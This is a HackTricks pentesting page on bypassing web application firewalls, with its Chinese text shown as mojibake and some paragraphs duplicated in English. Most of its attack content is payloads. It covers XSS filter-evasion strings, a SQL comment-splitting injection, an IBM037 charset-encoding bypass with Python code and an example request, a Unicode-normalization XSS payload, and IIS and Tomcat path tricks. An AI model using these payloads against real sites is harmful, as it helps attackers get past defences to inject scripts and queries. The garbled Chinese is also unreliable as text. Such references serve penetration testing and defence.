# WAFç»•è¿‡

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡
å¯ä»¥ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯æ¥ç»•è¿‡é˜²ç«å¢™ä¸Šçš„æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨ã€‚ä¾‹å¦‚ï¼Œäº¤æ›¿å¤§å°å†™ã€æ·»åŠ æ¢è¡Œç¬¦å’Œç¼–ç æœ‰æ•ˆè½½è·ã€‚æœ‰å…³å„ç§ç»•è¿‡æ–¹æ³•çš„èµ„æºå¯ä»¥åœ¨[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)å’Œ[OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)æ‰¾åˆ°ã€‚ä¸‹é¢çš„ç¤ºä¾‹æ‘˜è‡ª[è¿™ç¯‡æ–‡ç« ](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)ã€‚
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## å­—ç¬¦é›†ç¼–ç 

When dealing with web applications, it is common to encounter Web Application Firewalls (WAFs) that are designed to protect against various attacks. One common technique used by WAFs is to inspect the request and response payloads for malicious content. 

åœ¨å¤„ç†Webåº”ç”¨ç¨‹åºæ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°æ—¨åœ¨é˜²å¾¡å„ç§æ”»å‡»çš„Webåº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼ˆWAFï¼‰ã€‚WAFå¸¸ç”¨çš„ä¸€ç§æŠ€æœ¯æ˜¯æ£€æŸ¥è¯·æ±‚å’Œå“åº”çš„æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥æŸ¥æ‰¾æ¶æ„å†…å®¹ã€‚

One way to bypass a WAF is by manipulating the character encoding of the payload. By using different character encodings, it is possible to obfuscate the payload and evade detection by the WAF. 

ç»•è¿‡WAFçš„ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡æ“çºµæœ‰æ•ˆè´Ÿè½½çš„å­—ç¬¦ç¼–ç ã€‚é€šè¿‡ä½¿ç”¨ä¸åŒçš„å­—ç¬¦ç¼–ç ï¼Œå¯ä»¥å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œæ··æ·†ï¼Œå¹¶é€ƒé¿WAFçš„æ£€æµ‹ã€‚

For example, if a WAF is configured to block certain keywords or patterns, encoding the payload using a different character set can help bypass these filters. 

ä¾‹å¦‚ï¼Œå¦‚æœWAFé…ç½®ä¸ºé˜»æ­¢æŸäº›å…³é”®å­—æˆ–æ¨¡å¼ï¼Œä½¿ç”¨ä¸åŒçš„å­—ç¬¦é›†å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œç¼–ç å¯ä»¥å¸®åŠ©ç»•è¿‡è¿™äº›è¿‡æ»¤å™¨ã€‚

Some common techniques for encoding payloads include URL encoding, Unicode encoding, and HTML entity encoding. Each technique has its own syntax and rules for encoding characters. 

ä¸€äº›å¸¸è§çš„æœ‰æ•ˆè´Ÿè½½ç¼–ç æŠ€æœ¯åŒ…æ‹¬URLç¼–ç ã€Unicodeç¼–ç å’ŒHTMLå®ä½“ç¼–ç ã€‚æ¯ç§æŠ€æœ¯éƒ½æœ‰è‡ªå·±çš„è¯­æ³•å’Œå­—ç¬¦ç¼–ç è§„åˆ™ã€‚

It is important to understand the specific encoding used by the target application and the WAF in order to effectively bypass the filters. 

ä¸ºäº†æœ‰æ•ˆåœ°ç»•è¿‡è¿‡æ»¤å™¨ï¼Œäº†è§£ç›®æ ‡åº”ç”¨ç¨‹åºå’ŒWAFä½¿ç”¨çš„ç‰¹å®šç¼–ç æ˜¯å¾ˆé‡è¦çš„ã€‚

In addition to encoding, other techniques such as using alternative representations of characters or encoding the payload multiple times can also be used to bypass WAFs. 

é™¤äº†ç¼–ç ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€æœ¯ï¼Œå¦‚ä½¿ç”¨å­—ç¬¦çš„æ›¿ä»£è¡¨ç¤ºæˆ–å¤šæ¬¡å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œç¼–ç ï¼Œä»¥ç»•è¿‡WAFã€‚

Overall, understanding how character encoding works and experimenting with different encoding techniques can be valuable for bypassing WAFs and successfully exploiting vulnerabilities in web applications. 

æ€»çš„æ¥è¯´ï¼Œäº†è§£å­—ç¬¦ç¼–ç çš„å·¥ä½œåŸç†å¹¶å°è¯•ä¸åŒçš„ç¼–ç æŠ€æœ¯å¯¹äºç»•è¿‡WAFå¹¶æˆåŠŸåˆ©ç”¨Webåº”ç”¨ç¨‹åºä¸­çš„æ¼æ´éå¸¸æœ‰ä»·å€¼ã€‚
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## æ··æ·†

Obfuscation is a technique used to make code or data difficult to understand or analyze. In the context of web application security, obfuscation can be used to bypass Web Application Firewalls (WAFs) by disguising malicious payloads or evading signature-based detection.

### JavaScript Obfuscation

JavaScript obfuscation involves transforming code to make it more difficult to read and understand. This can be achieved through techniques such as:

- **Variable and function name obfuscation**: Renaming variables and functions to random or meaningless names.
- **String obfuscation**: Encoding strings to make them less recognizable.
- **Code splitting**: Breaking up code into smaller parts and dynamically loading them.
- **Control flow obfuscation**: Modifying the order of code execution to confuse analysis tools.

### Payload Obfuscation

Payload obfuscation is the process of disguising malicious code to evade detection. This can be done by:

- **Encoding**: Transforming the payload using encoding techniques such as Base64 or URL encoding.
- **Encryption**: Encrypting the payload using a key or algorithm to make it unreadable.
- **Compression**: Compressing the payload to make it more difficult to analyze.
- **Randomization**: Adding random data or noise to the payload to make it harder to detect.

### Evading Signature-based Detection

Signature-based detection is a common method used by WAFs to identify and block known attack patterns. To bypass this detection, attackers can modify the payload or use techniques such as:

- **Payload mutation**: Making small changes to the payload to create a new signature that is not recognized by the WAF.
- **Protocol-level evasion**: Modifying the request or response headers to evade signature-based detection.
- **Fragmentation**: Splitting the payload into smaller fragments to bypass payload size restrictions.

By using obfuscation techniques, attackers can increase the chances of successfully bypassing WAFs and executing their malicious payloads.
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## Unicodeå…¼å®¹æ€§
æ ¹æ®Unicodeè§„èŒƒçš„å®ç°æ–¹å¼ï¼ˆæ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://jlajara.gitlab.io/Bypass_WAF_Unicode)ï¼‰ï¼Œå…±äº«Unicodeå…¼å®¹æ€§çš„å­—ç¬¦å¯èƒ½èƒ½å¤Ÿç»•è¿‡WAFå¹¶æ‰§è¡Œé¢„æœŸçš„æœ‰æ•ˆè´Ÿè½½ã€‚å¯ä»¥åœ¨[è¿™é‡Œ](https://www.compart.com/en/unicode)æ‰¾åˆ°å…¼å®¹å­—ç¬¦ã€‚

### ç¤ºä¾‹
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
## è¶…è¿‡å¤§å°é™åˆ¶

åœ¨åŸºäºäº‘çš„WAFä¸­ï¼Œå¦‚æœè´Ÿè½½å¤§å°è¶…è¿‡Xå¤§å°ï¼Œè¯·æ±‚å°†ä¸ä¼šè¢«WAFæ£€æŸ¥ã€‚æ‚¨å¯ä»¥ç®€å•åœ°åˆ©ç”¨è¿™ä¸€ç‚¹æ¥ç»•è¿‡å®ƒä»¬ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“-[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
